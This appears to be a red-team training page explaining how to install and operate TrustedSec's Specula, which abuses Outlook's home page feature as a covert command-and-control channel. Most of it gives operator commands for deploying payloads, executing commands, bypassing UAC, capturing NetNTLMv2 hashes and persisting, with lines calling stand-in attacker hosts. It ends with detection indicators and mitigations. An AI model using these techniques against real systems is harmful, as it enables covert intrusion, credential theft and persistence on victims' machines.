---
layout: training-page
title: "Specula — Outlook C2 Framework — Red Team Academy"
module: "C2 Frameworks"
tags:
  - c2
  - specula
  - outlook
  - office
  - vbscript
  - macro
page_key: "c2-specula"
render_with_liquid: false
---

# Specula — Outlook as a C2

Specula (by TrustedSec) is a command-and-control framework that repurposes Microsoft Outlook's VBScript home page feature as a covert C2 channel. Rather than running shellcode or spawning unusual processes, Specula sets the Outlook home page to a URL controlled by the attacker. When Outlook opens, it renders the attacker's page inside the Outlook window — silently executing VBScript that creates a persistent, bidirectional command channel. This technique abuses a legitimate Outlook COM automation feature, making it difficult to distinguish from normal application behavior.

## How It Works

```
# Core mechanism:
# 1. Attacker sets HKCU\Software\Microsoft\Office\<version>\Outlook\WebView\Inbox\URL
#    registry key to point to attacker-controlled URL
# 2. When Outlook opens its Inbox view, it renders the URL in an embedded IE/WebView
# 3. The rendered page contains VBScript that runs inside the Outlook process context
# 4. VBScript has access to the Outlook COM object (window.external.OutlookApplication)
# 5. Agent polls attacker server, receives commands, executes locally, returns output

# Key advantage — execution happens INSIDE the Outlook.exe process:
# - Outlook is a trusted, signed Microsoft binary
# - No child processes spawned by default
# - Legitimate HTTPS traffic to attacker domain
# - WScript.Shell via COM — not a suspicious process spawn
```

## Installation

```
# Requirements: Python 3, root/sudo for web server binding
git clone https://github.com/trustedsec/specula
cd specula
pip install -r requirements.txt

# Specula must be run from its primary directory as root:
sudo python3 specula.py
```

## Initial Setup and Agent Deployment

```
# Launch Specula:
sudo python3 specula.py
# Specula C2>

# Generate a payload — sets Outlook home page registry key on victim:
Specula C2> payload
# Follow prompts: select listener URL, output format
# Output: PowerShell one-liner or reg file to deploy to victim

# The registry key set by the payload:
# HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox\URL
# Value: https://ATTACKER_SERVER/agent.html

# Deploy via any initial access vector:
# - Phishing email with macro that runs the registry write
# - Existing access via another shell
# - GPO if you have AD write access
# - HTA dropper, supply chain, etc.

# After registry key is set, the agent activates when victim opens Outlook
```

## Agent Commands — Enumeration

```
# Interact with an active agent:
Specula C2> interact AGENT_ID

# Host enumeration:
specula (AGENT_ID)> run enumerate/host/application
specula (AGENT_ID)> run enumerate/host/host
specula (AGENT_ID)> run enumerate/ldap/ldap

# List installed software on target:
specula (AGENT_ID)> run enumerate/host/application

# Enumerate domain via LDAP (uses Outlook's COM to make LDAP queries):
specula (AGENT_ID)> run enumerate/ldap/ldap
```

## Agent Commands — Execution

```
# Execute arbitrary command via WScript.Shell:
specula (AGENT_ID)> run execute/host/cmd
# Input: cmd /c whoami /all

# Execute via WMI (less visible than WScript.Shell):
specula (AGENT_ID)> run execute/host/wmi_execute
# Input: cmd /c ipconfig /all

# Spawn process under Explorer.exe (parent PID spoofing):
specula (AGENT_ID)> run execute/host/spawnproc_explorer
# Input: C:\Windows\System32\cmd.exe /c whoami

# Execute Excel 4.0 Macro (XLM) via Outlook's COM Excel object:
specula (AGENT_ID)> run execute/host/execute_excel4macro
# Input: CALL("Shell","cmd /c calc.exe","H",1)

# Load and execute an XLL add-in:
specula (AGENT_ID)> run execute/host/execute_registerxll
# Input: \\ATTACKER\share\malicious.xll

# UAC bypass via sdclt.exe:
specula (AGENT_ID)> run execute/host/uac-sdclt
# Input: cmd /c powershell.exe -enc BASE64_PAYLOAD
```

## Credential Capture

```
# Capture NetNTLMv2 hashes by forcing Outlook to authenticate to attacker SMB:
specula (AGENT_ID)> run execute/host/capture_netntlmv2
# Requires: attacker SMB listener (Responder/impacket-smbserver)
# Sets HTTP proxy via Outlook COM, forces auth to \\ATTACKER\share
# Captured hash can be cracked offline with hashcat/john

# Responder listener on attacker:
sudo python3 Responder.py -I eth0 -dwPv

# Or impacket:
sudo impacket-smbserver share . -smb2support
```

## Persistence — Calendar Home Page Hook

```
# The Inbox home page hook is removed when Outlook is re-opened or settings reset.
# Calendar home page hook provides an additional persistence mechanism:

specula (AGENT_ID)> run execute/host/set_calendarhomepagehook
# Sets Calendar folder home page to attacker URL
# Triggers when victim clicks the Calendar tab in Outlook

# Migrate home page to a different URL (update C2 address):
specula (AGENT_ID)> run execute/host/migrate_homepage
# Input: https://NEW_ATTACKER_URL/agent.html

# Remove the home page hook entirely (cleanup):
specula (AGENT_ID)> run execute/host/remove_homepage
```

## Hooker Generator — Custom VBScript Payloads

```
# Generate standalone VBScript payloads for the Outlook home page:
python3 hooker_generator.py

# hooker_generator creates the HTML/VBScript file that Outlook renders
# Customize it to add:
# - Additional C2 functions
# - Custom enumeration logic
# - Different exfil methods (DNS, HTTP, email)

# VBScript functions in Specula use Outlook's COM object:
# window.external.OutlookApplication — full Outlook object model access
# This gives access to: email, calendar, contacts, MAPI, GAL
```

## Detection Indicators

```
# Registry key creation (primary IOC):
# HKCU\Software\Microsoft\Office\<ver>\Outlook\WebView\Inbox\URL
# HKCU\Software\Microsoft\Office\<ver>\Outlook\WebView\Calendar\URL
# Monitor with: Sysmon EventID 13 (Registry value set)

# Network traffic:
# Outlook.exe making HTTPS requests to non-Microsoft/non-Exchange domains
# Regular polling interval (beacon traffic)
# Look for Outlook.exe as the source of unusual external HTTP(S) requests

# Process behavior:
# Outlook.exe spawning child processes (if using WScript.Shell execution)
# WMI activity originating from Outlook process context

# Mitigations:
# - Disable Outlook home page feature via Group Policy:
#   User Config → Administrative Templates → Microsoft Outlook → Disable Home Page URL
# - Block Outlook.exe from accessing non-corporate URLs via proxy/firewall
# - Monitor registry key writes to Outlook WebView paths
# - Application whitelisting rules that flag Outlook spawning cmd/powershell
```

## Resources

- Specula — TrustedSec — `github.com/trustedsec/specula`
- TrustedSec blog — Outlook home page C2 — `trustedsec.com/blog/`
- MITRE ATT&CK T1137 — Office Application Startup — `attack.mitre.org/techniques/T1137/`
- MITRE ATT&CK T1059.005 — Visual Basic — `attack.mitre.org/techniques/T1059/005/`
- Outlook WebView home page abuse research — `sensepost.com/blog/2017/outlook-home-page-another-brick-in-the-wall/`
